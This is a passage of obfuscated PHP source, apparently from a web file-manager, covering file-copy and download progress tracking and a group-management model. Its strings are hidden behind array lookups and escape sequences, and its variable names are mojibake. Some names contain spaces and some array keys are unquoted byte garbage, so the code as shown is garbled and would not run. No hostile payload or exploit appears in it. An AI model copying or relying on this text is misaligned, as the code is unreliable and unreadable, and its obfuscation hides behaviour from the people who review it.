($–äèõ÷Õ[$Õèâ¬™å[33]] == $Õèâ¬™å[233]) { $ÄüºÚãı[$Õèâ¬™å[1150]] += 1; } else { $ÄüºÚãı[$Õèâ¬™å[1150]] += $–äèõ÷Õ[$Õèâ¬™å[82]][$Õèâ¬™å[80]]; if ($–äèõ÷Õ[$Õèâ¬™å[194]]) { $ÄüºÚãı[$Õèâ¬™å[1150]] += $–äèõ÷Õ[$Õèâ¬™å[82]][$Õèâ¬™å[81]] + 1; } } $ÄüºÚãı[$Õèâ¬™å[837]] += $–äèõ÷Õ[$Õèâ¬™å[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($È ¢·£ø) { } public function sourceAddHashEnd($“äÀ¶Ã) { } public function sourceAddFileStart($Ë·ëÎŸ) { $ôŒ˜ş†‹ =& $_SERVER[¼¥ÊĞÙÌ]; $† Õ•°½ =& $this->task; $† Õ•°½[$ôŒ˜ş†‹[1844]] = $Ë·ëÎŸ[$ôŒ˜ş†‹[79]]; $† Õ•°½[$ôŒ˜ş†‹[1842]] = $Ë·ëÎŸ[$ôŒ˜ş†‹[32]]; $† Õ•°½[$ôŒ˜ş†‹[1152]] = $Ë·ëÎŸ[$ôŒ˜ş†‹[32]]; $† Õ•°½[$ôŒ˜ş†‹[1855]] = $Ë·ëÎŸ[$ôŒ˜ş†‹[87]]; $this->update(); } public function sourceAddFileEnd($ñøÍËü) { $Ìœü¨ÅÚ =& $_SERVER[¼¥ÊĞÙÌ]; $¡†ÁÕ’Õ =& $this->task; $¡†ÁÕ’Õ[$Ìœü¨ÅÚ[1849]] += $ñøÍËü[$Ìœü¨ÅÚ[79]]; $¡†ÁÕ’Õ[$Ìœü¨ÅÚ[1855]] = $ñøÍËü[$Ìœü¨ÅÚ[87]]; $this->update(1); } public function copyFileStart($öæ©ÈÎ , $Ü÷ËËÊÕ, $Àû§–›, $©ıĞ“üú, $Á÷œìš², $­ß¾©ü–) { $ıçå²‚ˆ =& $_SERVER[¼¥ÊĞÙÌ]; $š–©ÊÕ» = $Á÷œìš²; if ($š–©ÊÕ» == $GLOBALS[$ıçå²‚ˆ[1856]]) { $š–©ÊÕ» = $GLOBALS[$ıçå²‚ˆ[1857]]; } $GLOBALS[$ıçå²‚ˆ[1857]] = $Á÷œìš²; $GLOBALS[$ıçå²‚ˆ[1856]] = $­ß¾©ü–; $½ëŠú¹¦ =& $this->task; $½ëŠú¹¦[$ıçå²‚ˆ[1842]] = $š–©ÊÕ»; $½ëŠú¹¦[$ıçå²‚ˆ[1844]] = (int) $öæ©ÈÎ ->size($Ü÷ËËÊÕ); $½ëŠú¹¦[$ıçå²‚ˆ[1845]] = 0; $½ëŠú¹¦[$ıçå²‚ˆ[1152]] = $ıçå²‚ˆ[12]; $½ëŠú¹¦[$ıçå²‚ˆ[1846]] = $ıçå²‚ˆ[12]; $½ëŠú¹¦[$ıçå²‚ˆ[1847]] = 0; $ç‡ñ»Ô = $½ëŠú¹¦[$ıçå²‚ˆ[1844]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($½ëŠú¹¦[$ıçå²‚ˆ[478]] . $ıçå²‚ˆ[1858]); if ($ç‡ñ»Ô && file_exists(get_path_father($©ıĞ“üú))) { Cache::set($½ëŠú¹¦[$ıçå²‚ˆ[478]] . $ıçå²‚ˆ[1858], $©ıĞ“üú); $½ëŠú¹¦[$ıçå²‚ˆ[1815]] = array($ıçå²‚ˆ[1859], $ıçå²‚ˆ[1860]); } $this->update(0, $ç‡ñ»Ô); } public static function updateCopyLocalFileSize($Œ›¨¨¨) { $´ÀãÆå =& $_SERVER[¼¥ÊĞÙÌ]; $¨î¼ù¶” = Cache::get($Œ›¨¨¨[$´ÀãÆå[478]] . $´ÀãÆå[1858]); if (!$¨î¼ù¶” || !file_exists($¨î¼ù¶”)) { return $Œ›¨¨¨; } $Œ›¨¨¨[$´ÀãÆå[1845]] = @filesize($¨î¼ù¶”); $Œ›¨¨¨[$´ÀãÆå[1849]] += $Œ›¨¨¨[$´ÀãÆå[1845]]; self::updateTask($Œ›¨¨¨); return $Œ›¨¨¨; } public function copyFileEnd($œëÔàõ—, $Ù¢•àıà, $âÁ¼×Çä, $¦ã²ı¡ë, $éèĞÑä, $Ó˜¿à¼) { $°éè¬´â =& $_SERVER[¼¥ÊĞÙÌ]; $®âáğÜó =& $this->task; $®âáğÜó[$°éè¬´â[1845]] = $®âáğÜó[$°éè¬´â[1844]]; $®âáğÜó[$°éè¬´â[1846]] = $°éè¬´â[12]; unset($®âáğÜó[$°éè¬´â[1815]]); if ($éèĞÑä == $®âáğÜó[$°éè¬´â[1842]]) { $®âáğÜó[$°éè¬´â[1848]] += $®âáğÜó[$°éè¬´â[1844]]; $®âáğÜó[$°éè¬´â[1849]] = $®âáğÜó[$°éè¬´â[1848]]; $Ğı€éĞ = 1; if (isset($®âáğÜó[$°éè¬´â[1855]]) && $®âáğÜó[$°éè¬´â[1855]] == $Ù¢•àıà) { $Ğı€éĞ = 0; } $this->update($Ğı€éĞ); } else { $this->update(); $®âáğÜó[$°éè¬´â[1845]] = 0; } Cache::remove($®âáğÜó[$°éè¬´â[478]] . $°éè¬´â[1858]); self::log($°éè¬´â[1861] . $Ù¢•àıà . $°éè¬´â[73] . $¦ã²ı¡ë . $°éè¬´â[288] . $éèĞÑä . $°éè¬´â[1862] . $®âáğÜó[$°éè¬´â[1842]]); } public function updateFileEnd($Ğñ¬ğæ•, $¹¬×šïÎ) { $Ù³İô´ú =& $_SERVER[¼¥ÊĞÙÌ]; $¡Ñ¤õ×Ë =& $this->task; $¡Ñ¤õ×Ë[$Ù³İô´ú[1842]] = $Ğñ¬ğæ•; $¡Ñ¤õ×Ë[$Ù³İô´ú[1844]] = $¹¬×šïÎ; $¡Ñ¤õ×Ë[$Ù³İô´ú[1848]] += $¹¬×šïÎ; $¡Ñ¤õ×Ë[$Ù³İô´ú[1849]] = $¡Ñ¤õ×Ë[$Ù³İô´ú[1848]]; $this->update(1); self::log($Ù³İô´ú[1863] . $Ğñ¬ğæ•); } public function sourceModelCopy($‰‘«‡ù) { $„¥äÚ£ =& $_SERVER[¼¥ÊĞÙÌ]; $ó¶ê±À• = $‰‘«‡ù[0]; $ „ƒ¦Ìš = $‰‘«‡ù[1]; $õ­üòà =& $this->task; $this->sourceModelCopyFlag = !0; $ü§™Ÿ = 0; switch ($ó¶ê±À•) { case $„¥äÚ£[643]: $ü§™Ÿ = 1; break; case $„¥äÚ£[646]: $õ­üòà[$„¥äÚ£[1842]] = $ „ƒ¦Ìš[$„¥äÚ£[32]]; break; case $„¥äÚ£[648]: $ü§™Ÿ = intval($‰‘«‡ù[$„¥äÚ£[459]] * 0.4); break; case $„¥äÚ£[650]: $ü§™Ÿ = intval($‰‘«‡ù[$„¥äÚ£[459]] * 0.2); break; case $„¥äÚ£[652]: $ü§™Ÿ = intval($‰‘«‡ù[$„¥äÚ£[459]] * 0.4); break; } $this->update($ü§™Ÿ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($‰ô¡½ô, $³Ïœ£Ãã) { $£ß­äÂº =& $_SERVER[¼¥ÊĞÙÌ]; $this->sourceModelCopyFlag = !0; $²Ú…ûâæ = 1; if (isset($‰ô¡½ô[$£ß­äÂº[82]])) { $²Ú…ûâæ = $‰ô¡½ô[$£ß­äÂº[82]][$£ß­äÂº[80]]; $²Ú…ûâæ = $²Ú…ûâæ + $‰ô¡½ô[$£ß­äÂº[82]][$£ß­äÂº[81]] + 1; } $this->update($²Ú…ûâæ); $this->sourceModelCopyFlag = !1; } public function sourceMove($­ëĞ‘¾«) { $this->sourceRemove($­ëĞ‘¾«, !1); } public function curlProgress($ö–Í¿, $êšÏò¯, $áóÆÎ´ü, $æµÎŒü¥, $óıâÔÅö) { $ÃŸÂªşÉ =& $_SERVER[¼¥ÊĞÙÌ]; $É„¼»È =& $this->task; if ($óıâÔÅö > 0) { $É„¼»È[$ÃŸÂªşÉ[1152]] = $ÃŸÂªşÉ[1864]; $É„¼»È[$ÃŸÂªşÉ[1846]] = $ÃŸÂªşÉ[110]; if ($É„¼»È[$ÃŸÂªşÉ[1844]]) { $É„¼»È[$ÃŸÂªşÉ[1845]] = $óıâÔÅö; } if ($É„¼»È[$ÃŸÂªşÉ[1847]]) { $É„¼»È[$ÃŸÂªşÉ[1845]] = $óıâÔÅö + $É„¼»È[$ÃŸÂªşÉ[1847]]; } } else { if ($áóÆÎ´ü > 0) { if ($É„¼»È[$ÃŸÂªşÉ[1844]] == $êšÏò¯) { $É„¼»È[$ÃŸÂªşÉ[1845]] = $áóÆÎ´ü; $É„¼»È[$ÃŸÂªşÉ[1152]] = $ÃŸÂªşÉ[1865]; $É„¼»È[$ÃŸÂªşÉ[1846]] = $ÃŸÂªşÉ[1291]; } } } $this->update(); } public function curlProgressStart($à±€ƒ‘§) { } public function curlProgressEnd($øà¨Ÿê) { $æ™ï„ÑÁ =& $_SERVER[¼¥ÊĞÙÌ]; $§¸ÒÜçÙ =& $this->task; $É›İÄ†§ = curl_getinfo($øà¨Ÿê); $ôÒ©‡‰Õ = $É›İÄ†§[$æ™ï„ÑÁ[1866]]; if ($ôÒ©‡‰Õ == -1) { $ôÒ©‡‰Õ = $É›İÄ†§[$æ™ï„ÑÁ[1867]]; } if ($§¸ÒÜçÙ[$æ™ï„ÑÁ[1846]] == $æ™ï„ÑÁ[110] && $ôÒ©‡‰Õ) { $§¸ÒÜçÙ[$æ™ï„ÑÁ[1847]] += $ôÒ©‡‰Õ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Å•Œç™Ó =& $_SERVER[¼¥ÊĞÙÌ]; $ÂÌÊ€òà =& $this->task; $ÂÌÊ€òà[$Å•Œç™Ó[1868]] = 1; Hook::bind($Å•Œç™Ó[1836], array($this, $Å•Œç™Ó[1869])); Hook::bind($Å•Œç™Ó[1838], array($this, $Å•Œç™Ó[1870])); Hook::bind($Å•Œç™Ó[1840], array($this, $Å•Œç™Ó[1871])); } protected function endAfter() { $Ğ²ÁÅ“Ì =& $_SERVER[¼¥ÊĞÙÌ]; Hook::unbind($Ğ²ÁÅ“Ì[1836], array($this, $Ğ²ÁÅ“Ì[1869])); Hook::unbind($Ğ²ÁÅ“Ì[1838], array($this, $Ğ²ÁÅ“Ì[1870])); Hook::unbind($Ğ²ÁÅ“Ì[1840], array($this, $Ğ²ÁÅ“Ì[1871])); } public function progressStart($òØä˜ ) { $Š¡ƒ¹ñõ =& $_SERVER[¼¥ÊĞÙÌ]; $öÔîÁë¶ = curl_getinfo($òØä˜ ); self::log($Š¡ƒ¹ñõ[1872] . $öÔîÁë¶[$Š¡ƒ¹ñõ[385]]); self::valueSet($this->task[$Š¡ƒ¹ñõ[478]], $this->task); } public function progressEnd($¡ÂøâãŠ) { $¬‚å¦‚Ã =& $_SERVER[¼¥ÊĞÙÌ]; self::log($¬‚å¦‚Ã[1873] . $this->task[$¬‚å¦‚Ã[478]]); $this->end(); } public function progress($Ö¼İÁ…Û, $¥êÛÀ‹Î, $ˆëâÛâ, $òÎÚ ò, $ùèÎ¢ø) { $¤»ÊÕ•å =& $_SERVER[¼¥ÊĞÙÌ]; $Ê¹ûÈ¸š =& $this->task; if ($ùèÎ¢ø > 0) { $Ê¹ûÈ¸š[$¤»ÊÕ•å[1150]] = $Ê¹ûÈ¸š[$¤»ÊÕ•å[1150]] == 0 ? $òÎÚ ò : $Ê¹ûÈ¸š[$¤»ÊÕ•å[1150]]; $Ê¹ûÈ¸š[$¤»ÊÕ•å[1791]] = $ùèÎ¢ø; } else { if ($ˆëâÛâ > 0) { $Ê¹ûÈ¸š[$¤»ÊÕ•å[1150]] = $Ê¹ûÈ¸š[$¤»ÊÕ•å[1150]] == 0 ? $¥êÛÀ‹Î : $Ê¹ûÈ¸š[$¤»ÊÕ•å[1150]]; $Ê¹ûÈ¸š[$¤»ÊÕ•å[1791]] = $ˆëâÛâ; } } $this->update(); self::log("\x70\x72\157\147\x72\145\163\x73\x48\x74\164\160\72\144\x6f\x77\156\72{$ˆëâÛâ}\57{$¥êÛÀ‹Î}\x3b\40\165\x70\154\157\x61\x64\72{$ùèÎ¢ø}\57{$òÎÚ ò}\x3b"); } } goto CÜÙ·òìˆ; CÍˆ‡ãé‘: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\x6d\x65" => "\x67\x72\x6f\165\160\137\x6d\145\x74\141", "\155\145\164\141\106\x69\145\154\144" => "\147\162\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($¨¯¡”í¦) { $Úòòîèü =& $_SERVER[¼¥ÊĞÙÌ]; return array($Úòòîèü[2073] => array($¨¯¡”í¦[0], $Úòòîèü[2074]), $Úòòîèü[2075] => array($¨¯¡”í¦[0], $Úòòîèü[2076])); } protected function getInfo($ëó÷µ¼, $·³€ú“Ú = false) { $™Î€á¿ = $this->getInfoSimple($ëó÷µ¼); if (!$™Î€á¿) { return !1; } if ($·³€ú“Ú) { return $this->_listDataApplyItem($™Î€á¿); } return $this->cacheFunctionGet($_SERVER[¼¥ÊĞÙÌ][2077], $ëó÷µ¼); } protected function getInfoSimple($‘ŒîìÊ, $‡ö‰ÔÕ = false) { $«êƒËúı =& $_SERVER[¼¥ÊĞÙÌ]; if ($‡ö‰ÔÕ) { $ Ö°Ö³ = array($«êƒËúı[1402] => intval($‘ŒîìÊ)); $˜©Şşş„ = $this->where($ Ö°Ö³)->find(); return is_array($˜©Şşş„) ? $˜©Şşş„ : array(); } return $this->cacheFunctionGet($«êƒËúı[2078], $‘ŒîìÊ); } protected function groupAdd($µ±´… Õ) { $‰ÈÕ´¦© =& $_SERVER[¼¥ÊĞÙÌ]; if (!$µ±´… Õ[$‰ÈÕ´¦©[193]] && isset($µ±´… Õ[$‰ÈÕ´¦©[1402]]) && $µ±´… Õ[$‰ÈÕ´¦©[1402]] == 1) { if ($éôæÉÈÄ = $this->getInfoSimple($µ±´… Õ[$‰ÈÕ´¦©[1402]], !0)) { return $µ±´… Õ[$‰ÈÕ´¦©[1402]]; } } else { $éôæÉÈÄ = $this->getInfoSimple($µ±´… Õ[$‰ÈÕ´¦©[193]]); if (!$éôæÉÈÄ) { return !1; } } $ı§Ä’èÂ = $‰ÈÕ´¦©[598]; if ($éôæÉÈÄ[$‰ÈÕ´¦©[589]]) { $ı§Ä’èÂ = $éôæÉÈÄ[$‰ÈÕ´¦©[589]] . $éôæÉÈÄ[$‰ÈÕ´¦©[1402]] . $‰ÈÕ´¦©[50]; } $ÙËÉÒê× = array($‰ÈÕ´¦©[497] => $this->groupNameAuto($µ±´… Õ[$‰ÈÕ´¦©[193]], $µ±´… Õ[$‰ÈÕ´¦©[32]]), $‰ÈÕ´¦©[480] => $µ±´… Õ[$‰ÈÕ´¦©[193]], $‰ÈÕ´¦©[660] => $ı§Ä’èÂ, $‰ÈÕ´¦©[2079] => $µ±´… Õ[$‰ÈÕ´¦©[1978]], $‰ÈÕ´¦©[2080] => 0, $‰ÈÕ´¦©[1995] => 0); $µ±´… Õ[$‰ÈÕ´¦©[32]] = $ÙËÉÒê×[$‰ÈÕ´¦©[32]]; if (isset($µ±´… Õ[$‰ÈÕ´¦©[2015]])) { $ÙËÉÒê×[$‰ÈÕ´¦©[2015]] = $µ±´… Õ[$‰ÈÕ´¦©[2015]]; } else { $ÀÁÆß± = $this->max($‰ÈÕ´¦©[2015]); if (!$ÀÁÆß±) { $ÀÁÆß± = 0; } $ÙËÉÒê×[$‰ÈÕ´¦©[2015]] = $ÀÁÆß± + 1; } if (!empty($µ±´… Õ[$‰ÈÕ´¦©[1402]])) { $ÙËÉÒê×[$‰ÈÕ´¦©[1402]] = $µ±´… Õ[$‰ÈÕ´¦©[1402]]; } $”íúÏ× = $this->add($ÙËÉÒê×); $this->groupMetaEdit($”íúÏ×, $µ±´… Õ); Model($‰ÈÕ´¦©[1440])->groupRootAdd($”íúÏ×); $this->_clearCache($µ±´… Õ[$‰ÈÕ´¦©[193]]); return $”íúÏ×; } protected function groupEdit($Ö·Áå´, $à¦§àéğ) { $¡áô§¸ =& $_SERVER[¼¥ÊĞÙÌ]; $ƒãôÁï = $this->getInfoSimple($Ö·Áå´); if (!$ƒãôÁï) { return !1; } if (!empty($à¦§àéğ[$¡áô§¸[193]])) { $ãÚ¿ú  = $this->getInfoSimple($à¦§àéğ[$¡áô§¸[193]]); if (!$ãÚ¿ú ) { return !1; } if ($ƒãôÁï[$¡áô§¸[1402]] == $ãÚ¿ú [$¡áô§¸[1402]]) { return !1; } if ($à¦§àéğ[$¡áô§¸[193]] != $ƒãôÁï[$¡áô§¸[193]]) { if ($ãÚ¿ú [$¡áô§¸[589]] !== $ƒãôÁï[$¡áô§¸[589]] && strpos($ãÚ¿ú [$¡áô§¸[589]], $ƒãôÁï[$¡áô§¸[589]] . $ƒãôÁï[$¡áô§¸[1402]] . $¡áô§¸[50]) === 0) { return !1; } $à¦§àéğ[$¡áô§¸[660]] = $ãÚ¿ú [$¡áô§¸[589]] . $à¦§àéğ[$¡áô§¸[193]] . $¡áô§¸[50]; $this->_changeChildLevel($ƒãôÁï, $ãÚ¿ú ); $this->_clearCache($ãÚ¿ú [$¡áô§¸[1402]]); $this->_clearCache($ƒãôÁï[$¡áô§¸[193]]); } } $this->groupMetaEdit($Ö·Áå´, $à¦§àéğ); $this->_clearChildrenCache($ƒãôÁï); return $this->where(array($¡áô§¸[2081] => $Ö·Áå´))->save($à¦§àéğ); } private function groupMetaEdit($Ú×’¡ÏŞ, &$ó³‰æø) { $Ö×Ğª¤€ =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($ó³‰æø[$Ö×Ğª¤€[32]])) { $this->setNamePinyin($Ú×’¡ÏŞ, $ó³‰æø[$Ö×Ğª¤€[32]]); } if (isset($ó³‰æø[$Ö×Ğª¤€[2082]])) { $¶£ƒÎÆ = array($Ö×Ğª¤€[2082] => $ó³‰æø[$Ö×Ğª¤€[2082]], $Ö×Ğª¤€[2083] => $ó³‰æø[$Ö×Ğª¤€[2083]]); unset($ó³‰æø[$Ö×Ğª¤€[2082]]); unset($ó³‰æø[$Ö×Ğª¤€[2083]]); if (isset($ó³‰æø[$Ö×Ğª¤€[2084]])) { $¿çãÍ»ß = $Ö×Ğª¤€[1398] . $Ú×’¡ÏŞ; $Ù—¯¤™Õ = $Ö×Ğª¤€[1397]; $ÕÃœ»„á = $ó³‰æø[$Ö×Ğª¤€[2084]] ? $ó³‰æø[$Ö×Ğª¤€[2084]] : $Ö×Ğª¤€[12]; $µÛúŸ¿ = Model($Ö×Ğª¤€[1396])->get($¿çãÍ»ß, $Ù—¯¤™Õ); $µÛúŸ¿ = $µÛúŸ¿ ? $µÛúŸ¿ : $Ö×Ğª¤€[12]; if ($µÛúŸ¿ != $ÕÃœ»„á) { if (!$ÕÃœ»„á && $µÛúŸ¿) { Model($Ö×Ğª¤€[1396])->remove($¿çãÍ»ß, $Ù—¯¤™Õ); } else { if ($ÕÃœ»„á) { Model($Ö×Ğª¤€[1396])->set($¿çãÍ»ß, $ÕÃœ»„á, $Ù—¯¤™Õ); } } } $¶£ƒÎÆ[$Ö×Ğª¤€[2084]] = $ÕÃœ»„á; } $this->metaSet($Ú×’¡ÏŞ, $¶£ƒÎÆ); } } private function _clearChildrenCache($À’‰¶Ë¥) { $Å©ŒşÛ =& $_SERVER[¼¥ÊĞÙÌ]; $¾õ÷ĞÉß = array($Å©ŒşÛ[660] => array($Å©ŒşÛ[620], $À’‰¶Ë¥[$Å©ŒşÛ[589]] . $À’‰¶Ë¥[$Å©ŒşÛ[1402]] . $Å©ŒşÛ[621])); $áİÖëÑ° = $this->field($Å©ŒşÛ[1402])->where($¾õ÷ĞÉß)->select(); foreach ($áİÖëÑ° as $Ó½–²ğ) { $this->_clearCache($Ó½–²ğ[$Å©ŒşÛ[1402]]); } } private function _clearCache($®ºÖõñï) { $¯¿ÅÌõ =& $_SERVER[¼¥ÊĞÙÌ]; $this->cacheFunctionClear($¯¿ÅÌõ[2077], $®ºÖõñï); $this->cacheFunctionClear($¯¿ÅÌõ[2078], $®ºÖõñï); } private function _changeChildLevel($ÛÙÂöËÚ, $ŒÉ¸‚Ş¿, $×¤¾ª˜ = false) { $Ø–€½Ô =& $_SERVER[¼¥ÊĞÙÌ]; $ÒÌ„Ç„• = $ÛÙÂöËÚ[$Ø–€½Ô[589]] . $ÛÙÂöËÚ[$Ø–€½Ô[1402]] . $Ø–€½Ô[50]; $Ì¯Øç´Ò = $ŒÉ¸‚Ş¿[$Ø–€½Ô[589]] . $ŒÉ¸‚Ş¿[$Ø–€½Ô[1402]] . $Ø–€½Ô[50] . $ÛÙÂöËÚ[$Ø–€½Ô[1402]] . $Ø–€½Ô[50]; if ($×¤¾ª˜) { $Ì¯Øç´Ò = $ŒÉ¸‚Ş¿[$Ø–€½Ô[589]] . $ŒÉ¸‚Ş¿[$Ø–€½Ô[1402]] . $Ø–€½Ô[50]; } $¡¨¿ìóÆ = array($Ø–€½Ô[660] => array($Ø–€½Ô[620], $ÛÙÂöËÚ[$Ø–€½Ô[589]] . $ÛÙÂöËÚ[$Ø–€½Ô[1402]] . $Ø–€½Ô[621])); $Ğ”ÕÀÏ = array($Ø–€½Ô[660] => array($Ø–€½Ô[669], "\162\145\160\x6c\141\x63\x65\x28\x70\141\x72\x65\156\164\x4c\145\x76\145\154\54\x27{$ÒÌ„Ç„•}\47\x2c\47{$Ì¯Øç´Ò}\x27\x29")); $this->_clearChildrenCache($ÛÙÂöËÚ); $this->where($¡¨¿ìóÆ)->data($Ğ”ÕÀÏ)->save(); } public function setNamePinyin($ÂÖ«ŒÅ, $¢Á®¹ = false) { $êÎ¦ú­• =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¢Á®¹) { $ç»Õº‡ = $this->getInfoSimple($ÂÖ«ŒÅ); $¢Á®¹ = $ç»Õº‡[$êÎ¦ú­•[32]]; } if (!Input::check($¢Á®¹, $êÎ¦ú­•[663])) { $this->metaSet($ÂÖ«ŒÅ, $êÎ¦ú­•[541], null); $this->metaSet($ÂÖ«ŒÅ, $êÎ¦ú­•[540], null); return; } $›ôª¥öÏ = array($êÎ¦ú­•[541] => str_replace($êÎ¦ú­•[53], $êÎ¦ú­•[12], Pinyin::get($¢Á®¹)), $êÎ¦ú­•[540] => Pinyin::get($¢Á®¹, $êÎ¦ú­•[664])); $this->metaSet($ÂÖ«ŒÅ, $›ôª¥öÏ); } protected function metaSet($…Ú”áÌê, $µ£òÀšÈ = null, $Ù¨íŞ = null) { $this->_clearCache($…Ú”áÌê); return parent::metaSet($…Ú”áÌê, $µ£òÀšÈ, $Ù¨íŞ); } protected function groupStatus($²–‘¼Çğ, $¶Û¡Ë«Ñ) { $Š†›Á¬ë =& $_SERVER[¼¥ÊĞÙÌ]; $Š±¢ºÍ = $this->getInfoSimple($²–‘¼Çğ); if (!$Š±¢ºÍ) { return !1; } $this->_clearCache($²–‘¼Çğ); return $this->metaSet($²–‘¼Çğ, $Š†›Á¬ë[824], $¶Û¡Ë«Ñ); if ($¶Û¡Ë«Ñ == $Š†›Á¬ë[91]) { $µ÷Ïş¨î = $this->parentLevelArray($Š±¢ºÍ[$Š†›Á¬ë[589]]); } else { } $µ÷Ïş¨î[] = $Š±¢ºÍ[$Š†›Á¬ë[1402]]; $×ÈØş¹ú = array(); foreach ($µ÷Ïş¨î as $²–‘¼Çğ) { $×ÈØş¹ú[] = array($Š†›Á¬ë[1402] => $²–‘¼Çğ, $Š†›Á¬ë[97] => $Š†›Á¬ë[824], $Š†›Á¬ë[453] => $¶Û¡Ë«Ñ); $this->_clearCache($²–‘¼Çğ); } return Model($Š†›Á¬ë[2085])->addAll($×ÈØş¹ú, array(), !0); } protected function groupRemove($Ö…ĞÀ€Ÿ, $Í¦äƒ¶ñ = false) { $«¥ÍÑÔ„ =& $_SERVER[¼¥ÊĞÙÌ]; $½æÜ°™® = array($«¥ÍÑÔ„[1402] => $Ö…ĞÀ€Ÿ); $ÑìÁ‹“ = $this->where($½æÜ°™®)->find(); if (!$ÑìÁ‹“ || $ÑìÁ‹“[$«¥ÍÑÔ„[193]] == 0) { return !1; } if (!$Í¦äƒ¶ñ) { $ÚµÜÜğƒ = $this->getInfoSimple($ÑìÁ‹“[$«¥ÍÑÔ„[193]]); $this->_changeChildLevel($ÑìÁ‹“, $ÚµÜÜğƒ, !0); $this->where(array($«¥ÍÑÔ„[193] => $Ö…ĞÀ€Ÿ))->save(array($«¥ÍÑÔ„[193] => $ÑìÁ‹“[$«¥ÍÑÔ„[193]])); $this->_clearCache($ÚµÜÜğƒ[$«¥ÍÑÔ„[1402]]); } Model($«¥ÍÑÔ„[2085])->where($½æÜ°™®)->delete(); Model($«¥ÍÑÔ„[2086])->where($½æÜ°™®)->delete(); Model($«¥ÍÑÔ„[904])->groupRootRemove($Ö…ĞÀ€Ÿ); $this->_clearCache($ÑìÁ‹“[$«¥ÍÑÔ„[193]]); return $this->where($½æÜ°™®)->delete(); } protected function groupSort($†ß•©œş) { $ÉÇÀ¸¿ù =& $_SERVER[¼¥ÊĞÙÌ]; $ó›èéõ– = array(); foreach ($†ß•©œş as $²ÍÑöõ¯ => $É†£ÔşÙ) { $ó›èéõ–[] = array($ÉÇÀ¸¿ù[1402], $É†£ÔşÙ, $ÉÇÀ¸¿ù[2015], $²ÍÑöõ¯ + 1); } $this->saveAll($ó›èéõ–); } public function listData() { $Ù»¾»Ç = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ù»¾»Ç[$_SERVER[¼¥ÊĞÙÌ][448]]); return $Ù»¾»Ç; } private function _makeOrder($Êä ßŸ† = '') { $¡†ÇË„— =& $_SERVER[¼¥ÊĞÙÌ]; $‹÷çÂÕ = array($¡†ÇË„—[1402], $¡†ÇË„—[32], $¡†ÇË„—[1980], $¡†ÇË„—[234]); $åœ–™•÷ = array($¡†ÇË„—[526] => $¡†ÇË„—[527], $¡†ÇË„—[528] => $¡†ÇË„—[529]); $üŒêÔ¢ã = Input::get($¡†ÇË„—[533], $¡†ÇË„—[7], $¡†ÇË„—[1995], $‹÷çÂÕ); $òüğÁ³ = Input::get($¡†ÇË„—[534], $¡†ÇË„—[7], $¡†ÇË„—[2087], array($¡†ÇË„—[2087], $¡†ÇË„—[528])); $òüğÁ³ = $åœ–™•÷[$òüğÁ³]; $Êä ßŸ† = $Êä ßŸ† . "{$üŒêÔ¢ã}\40{$òüğÁ³}\x2c\40\147\162\x6f\165\160\x49\104\40\141\163\x63"; return $this->order($Êä ßŸ†); } public function listChild($¨­´ê£Î) { $ŠÔÏ–­ =& $_SERVER[¼¥ÊĞÙÌ]; $ì´‚”Ê‹ = $this->where(array($ŠÔÏ–­[193] => $¨­´ê£Î))->_makeOrder()->selectPage(200); $this->_listDataApply($ì´‚”Ê‹[$ŠÔÏ–­[448]]); return $ì´‚”Ê‹; } public function listChildIds($²áŒµÇ£) { $¡¡ªÖ§ =& $_SERVER[¼¥ÊĞÙÌ]; if (is_string($£Öã°)) { $²áŒµÇ£ = explode($¡¡ªÖ§[50], $²áŒµÇ£); } $›†×¼·Â = $this->where(array($¡¡ªÖ§[1402] => array($¡¡ªÖ§[7], $²áŒµÇ£)))->field($¡¡ªÖ§[2088])->select(); if (!$›†×¼·Â) { return !1; } $…‰ĞØÀë = array(); foreach ($›†×¼·Â as $À¨À£ı) { $…‰ĞØÀë[] = "\x73\145\154\145\x63\164\x20\147\x72\157\x75\x70\x49\x44\40\146\x72\x6f\x6d\40\x60\147\x72\x6f\x75\x70\140\x20\x77\x68\145\162\x65\40\x70\x61\162\x65\x6e\164\114\145\166\x65\x6c\x20\x6c\151\x6b\x65\x20\x27{$À¨À£ı[$¡¡ªÖ§[589]]}{$À¨À£ı[$¡¡ªÖ§[1402]]}\x2c\45\x27"; } $…‰ĞØÀë = implode($¡¡ªÖ§[2089], $…‰ĞØÀë); $›†×¼·Â = $this->query($…‰ĞØÀë); if (!$›†×¼·Â) { return array(); } $²áŒµÇ£ = array_to_keyvalue($›†×¼·Â, $¡¡ªÖ§[12], $¡¡ªÖ§[1402]); return array_unique($²áŒµÇ£); } public function listByID($ ¤¯Ñ“) { $ó¿úöŠı =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ ¤¯Ñ“) { return array(); } $«†ÅèĞ¬ = array($ó¿úöŠı[1402] => array($ó¿úöŠı[7], $ ¤¯Ñ“)); $®…şÄòÁ = $this->where($«†ÅèĞ¬)->select(); $®…şÄòÁ = array_sort_keep($®…şÄòÁ, $ó¿úöŠı[1402], $ ¤¯Ñ“); $this->_listDataApply($®…şÄòÁ); return $®…şÄòÁ; } public function listSearch($’§‹¢„¢) { $èò¥Õ =& $_SERVER[¼¥ÊĞÙÌ]; $ÉÇıœ‚¦ = trim($’§‹¢„¢[$èò¥Õ[2090]]); $ŞÙèÃóÎ = explode($èò¥Õ[53], $ÉÇıœ‚¦); if (!$ÉÇıœ‚¦ || count($ŞÙèÃóÎ) == 1) { return $this->listSearchNow($’§‹¢„¢); } $šÆÀğÑ‰ = array($èò¥Õ[448] => array()); foreach ($ŞÙèÃóÎ as $¿â˜Ñˆ…) { if (!trim($¿â˜Ñˆ…)) { continue; } $’§‹¢„¢[$èò¥Õ[2090]] = $¿â˜Ñˆ…; $ÀÃÀó¿€ = $this->listSearchNow($’§‹¢„¢); $šÆÀğÑ‰[$èò¥Õ[448]] = array_merge($šÆÀğÑ‰[$èò¥Õ[448]], $ÀÃÀó¿€[$èò¥Õ[448]]); } $šÆÀğÑ‰[$èò¥Õ[448]] = 